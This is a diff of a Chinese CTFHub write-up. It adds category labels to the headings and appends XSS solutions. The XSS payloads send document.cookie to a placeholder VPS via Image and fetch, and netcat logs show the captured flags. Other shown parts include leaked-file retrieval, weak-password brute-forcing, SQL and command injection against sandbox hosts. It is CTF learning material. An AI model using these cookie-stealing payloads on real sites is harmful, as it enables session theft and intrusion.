@@ -1,5 +1,5 @@
 
-### 请求方式
+### 信息泄露 - 请求方式
 
 根据提示，使用 `CTFHUB` 方式请求
 
@@ -21,7 +21,7 @@ good job! ctfhub{0014f3ea8e1e7150b94cda4b}
 
 flag: `ctfhub{0014f3ea8e1e7150b94cda4b}`
 
-### 302 跳转
+### 信息泄露 - 302 跳转
 
 根据提示是重定向，不要 follow redirect 就可以了
 
@@ -44,7 +44,7 @@ ctfhub{fe6f22b094da541943d34f68}
 
 flag: `ctfhub{fe6f22b094da541943d34f68}`
 
-### Cookie
+### 信息泄露 - Cookie
 
 ```bash
 $ curl -i "http://challenge-69089ea35fc8ddac.sandbox.ctfhub.com:10800/"
@@ -83,7 +83,7 @@ ctfhub{71c22e974f97fc93ec070b99}
 
 flag: `ctfhub{71c22e974f97fc93ec070b99}`
 
-### 基础认证
+### 信息泄露 - 基础认证
 
 ```bash
 $ curl -i "http://challenge-9ab9e243ade97b54.sandbox.ctfhub.com:10800/flag.html"
@@ -158,13 +158,13 @@ ctfhub{705a46bedb9bbd76d64baf73}
 
 flag: `ctfhub{705a46bedb9bbd76d64baf73}`
 
-### 响应包源代码
+### 信息泄露 - 响应包源代码
 
 不用开游戏，直接翻 html 源代码就可以看到 flag
 
 flag: `ctfhub{6ad3eb5fe2ea7d5b236b8cba}`
 
-### 目录遍历
+### 信息泄露 - 目录遍历
 
 ```bash
 $ curl "http://challenge-b89bdb40dfbfe07c.sandbox.ctfhub.com:10800/flag_in_here/4/2/flag.txt"
@@ -173,13 +173,13 @@ ctfhub{3fa42395c00b66ed7c32fa09}
 
 flag: `ctfhub{3fa42395c00b66ed7c32fa09}`
 
-### PHPINFO
+### 信息泄露 - PHPINFO
 
 直接网页搜索就好了
 
 flag: `ctfhub{f9c8cec1765b37b862dcc4fa}`
 
-### 网站源码
+### 信息泄露 - 网站源码
 
 根据题目描述，给了可能的文件名和后缀，那么，开始爆破吧
 
@@ -227,7 +227,7 @@ ctfhub{7f5b8ac5b1a9068f814f0217}
 
 flag: `ctfhub{7f5b8ac5b1a9068f814f0217}`
 
-### bak 文件
+### 信息泄露 - bak 文件
 
 ```bash
 $ curl "http://challenge-aec80717f912ca94.sandbox.ctfhub.com:10800/index.php.bak"
@@ -249,7 +249,7 @@ echo "Flag in index.php source code.";
 
 flag: `ctfhub{7eca46b4361c84fb3cc5279c}`
 
-### vim 缓存
+### 信息泄露 - vim 缓存
 
 ```
 $ wget "http://challenge-917fe927c2514035.sandbox.ctfhub.com:10800/.index.php.swp"
@@ -259,7 +259,7 @@ $ vim -r .index.php.swp
 
 flag: `ctfhub{25bbafd258dfb2d994e43f46}`
 
-### .DS_Store
+### 信息泄露 - .DS_Store
 
 找个工具一把梭：
 
@@ -286,7 +286,7 @@ Module: dumpall.addons.dsdumper
 
 flag: `ctfhub{366885c612a6ddd17ba317cb}`
 
-### Git 泄露 - Log
+### 信息泄露 - Log
 
 ```bash
 $ curl "http://challenge-33d2dab378983665.sandbox.ctfhub.com:10800/.git/logs/HEAD"
@@ -347,7 +347,7 @@ $ xxd output
 
 flag: `ctfhub{665ad7112b89294f5fa647f6}`
 
-### Git 泄露 - Stash
+### 信息泄露 - Stash
 
 ```bash
 $ curl "http://challenge-969c65bb8fb87c8e.sandbox.ctfhub.com:10800/.git/refs/stash"
@@ -400,7 +400,7 @@ ctfhub{7f3bae4a37ae8a6ced71528d}
 
 flag: `ctfhub{7f3bae4a37ae8a6ced71528d}`
 
-### Git 泄露 - index
+### 信息泄露 - index
 
 ```bash
 $ wget "http://challenge-7e8654a5da958626.sandbox.ctfhub.com:10800/.git/index"
@@ -441,7 +441,7 @@ ctfhub{4810073b50315a6ad0ca5286}
 
 flag: `ctfhub{4810073b50315a6ad0ca5286}`
 
-### SVN 泄露
+### 信息泄露 - SVN 泄露
 
 这年头谁还用 svn 啊，直接工具一把梭了：
 
@@ -467,7 +467,7 @@ grep: .svn/wc.db: binary file matches
 
 flag: `ctfhub{665c9072041c4e31608e32a6}`
 
-### HG 泄露
+### 信息泄露 - HG 泄露
 
 ```bash
 root@b0517fda18c5:/dvcs-ripper# perl rip-hg.pl -v -s -u "http://challenge-997bd931f11fecef.sandbox.ctfhub.com:10800/.hg/"
@@ -486,7 +486,7 @@ ctfhub{9a264f20c5f7724a0b509f9e}
 
 flag: `ctfhub{9a264f20c5f7724a0b509f9e}`
 
-### 弱口令
+### 密码口令 - 弱口令
 
 跑了一下 top100 的密码本没跑出来，网上查了一下密码是 `admin888`。。。浓厚的老中味道
 
@@ -518,13 +518,13 @@ for mpass in wordlist:
 
 flag: `ctfhub{605839de08da6a3d58c873de}`
 
-###  默认密码
+###  密码口令 - 默认密码
 
 😅网上找默认密码：`eyougw:admin@(eyou)`
 
 flag: `ctfhub{690a50ae1d710046a37bbfa5}`
 
-### 整数型注入
+### SQL 注入 - 整数型注入
 
 查询有哪些数据库：
 ```
@@ -548,7 +548,7 @@ flag: `ctfhub{690a50ae1d710046a37bbfa5}`
 
 flag: `ctfhub{d9e2564dbd5ea3452e0cb73f}`
 
-### 字符型注入
+### SQL 注入 - 字符型注入
 
 跟上一题没什么区别，只要注意引号对称就可以了
 
@@ -574,7 +574,7 @@ flag: `ctfhub{d9e2564dbd5ea3452e0cb73f}`
 
 flag: `ctfhub{f79bdfdfaaf2bbc506f193fa}`
 
-### 报错注入
+### SQL 注入 - 报错注入
 
 使用 `updatexml` 构造报错
 ```
@@ -809,3 +809,211 @@ http://challenge-fda95211f14d1173.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0acd${I
 ```
 
 flag: `ctfhub{ec29bf0f00e0425afef94e09}`
+
+### XSS - 反射型
+
+```
+http://challenge-42da80f82dbd8cb4.sandbox.ctfhub.com:10800/?name=bob</h1>
+
+<script>
+
+var img = new Image();
+img.src = "http://YOUR_VPS_ADDR:1111/" + escape(document.cookie);
+document.body.appendChild(img);
+
+</script>
+
+<h1>emm
+```
+
+VPS 上开个监听，然后把上面的 payload 提交
+
+```shell
+root@6ca7eb:~# nc -lvp 1111
+Listening on [0.0.0.0] (family 0, port 1111)
+Connection from 222.186.57.91 49621 received!
+GET /flag%3Dctfhub%7Bc8aa84fbd8ee72e2d8cccc2f%7D HTTP/1.1
+Host: YOUR_VPS_ADDR:1111
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://challenge-42da80f82dbd8cb4.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+
+flag: `ctfhub{c8aa84fbd8ee72e2d8cccc2f}`
+
+### XSS - 存储型
+
+```
+bob</h1>
+
+<script>
+
+var img = new Image();
+img.src = "http://YOUR_VPS_ADDR:1111/" + escape(document.cookie);
+document.body.appendChild(img);
+
+</script>
+
+<h1>emm
+
+```
+
+先 change name，提交上面的 payload
+
+然后 vps 开监听，下面提交这个网页的网址就可以
+
+```shell
+root@-6ca7eb:~# nc -lvp 1111
+Listening on [0.0.0.0] (family 0, port 1111)
+Connection from 222.186.57.91 29599 received!
+GET /flag%3Dctfhub%7Ba66002481465aececc3d69b6%7D HTTP/1.1
+Host: YOUR_VPS_ADDR:1111
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://challenge-a395b18bd44e74a3.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+
+```
+
+flag: `ctfhub{a66002481465aececc3d69b6}`
+
+### XSS - DOM 反射
+
+首先翻一下源代码，客户端修改内容的代码是这样的：
+
+```html
+<script>
+	$("#text")[0].innerHTML = 'asdasd';
+</script>
+```
+
+所以有 payload：
+
+```
+bob';
+
+var img = new Image();
+img.src = "http://YOUR_VPS_ADDR:1111/" + escape(document.cookie);
+document.body.appendChild(img);
+
+'
+```
+
+```shell
+root@-6ca7eb:~# nc -lvp 1111
+Listening on [0.0.0.0] (family 0, port 1111)
+Connection from 222.186.57.91 4774 received!
+GET /flag%3Dctfhub%7B991562cd90e38072ba51495d%7D HTTP/1.1
+Host: YOUR_VPS_ADDR:1111
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Referer: http://challenge-886619cba6c3182b.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+
+flag: `ctfhub{991562cd90e38072ba51495d}`
+
+### XSS - DOM 跳转
+
+跳转部分代码：
+
+```html
+<script>
+	var target = location.search.split("=")
+	if (target[0].slice(1) == "jumpto") {
+		location.href = target[1];
+	}
+</script>
+```
+
+所以对应的 payload：
+
+```
+http://challenge-648e4b5b0920e51b.sandbox.ctfhub.com:10800/?jumpto=javascript:
+
+(function(){
+    fetch('http://YOUR_VPS_ADDR:1111/' + escape(document.cookie));
+ })()
+
+```
+
+```shell
+root@-6ca7eb:~# nc -lvp 1111
+Listening on [0.0.0.0] (family 0, port 1111)
+Connection from 222.186.57.91 10148 received!
+GET /flag%3Dctfhub%7B7e36e6c4635a1b3893c4f9b0%7D HTTP/1.1
+Host: YOUR_VPS_ADDR:1111
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
+Accept: */*
+Origin: http://challenge-648e4b5b0920e51b.sandbox.ctfhub.com:10800
+Referer: http://challenge-648e4b5b0920e51b.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+
+```
+
+flag: `ctfhub{7e36e6c4635a1b3893c4f9b0}`
+
+### XSS - 过滤空格
+
+```
+http://challenge-4f558d3ce182d603.sandbox.ctfhub.com:10800/?name=
+
+bob</h1><script>fetch('http://YOUR_VPS_ADDR:1111/'+document.cookie)</script><h1>emm
+```
+
+
+```shell
+root@-6ca7eb:~# nc -lvp 1111
+Listening on [0.0.0.0] (family 0, port 1111)
+Connection from 222.186.57.91 30331 received!
+GET /flag=ctfhub%7B6c4a04e48390234eab804ca9%7D HTTP/1.1
+Host: YOUR_VPS_ADDR:1111
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
+Accept: */*
+Origin: http://challenge-4f558d3ce182d603.sandbox.ctfhub.com:10800
+Referer: http://challenge-4f558d3ce182d603.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+
+flag: `ctfhub{6c4a04e48390234eab804ca9}`
+
+### XSS - 过滤关键词
+
+试一下双写能绕过
+
+```
+bob</h1><imimgg src=x ononerrorerror="alert(1)"><h1>emm
+```
+
+```
+bob</h1>
+<imimgg src=x ononerrorerror="fetch('http://YOUR_VPS_ADDR:1111/'+escape(document.cookie))"><h1>emm
+```
+
+```
+root@-6ca7eb:~# nc -lvp 1111
+Listening on [0.0.0.0] (family 0, port 1111)
+Connection from 222.186.57.91 62145 received!
+GET /flag%3Dctfhub%7B926b6edd12dc83ff9f4f8d29%7D HTTP/1.1
+Host: YOUR_VPS_ADDR:1111
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/112.0.5615.138 Safari/537.36
+Accept: */*
+Origin: http://challenge-9d951f4923096fbb.sandbox.ctfhub.com:10800
+Referer: http://challenge-9d951f4923096fbb.sandbox.ctfhub.com:10800/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+```
+
+flag: `ctfhub{926b6edd12dc83ff9f4f8d29}`
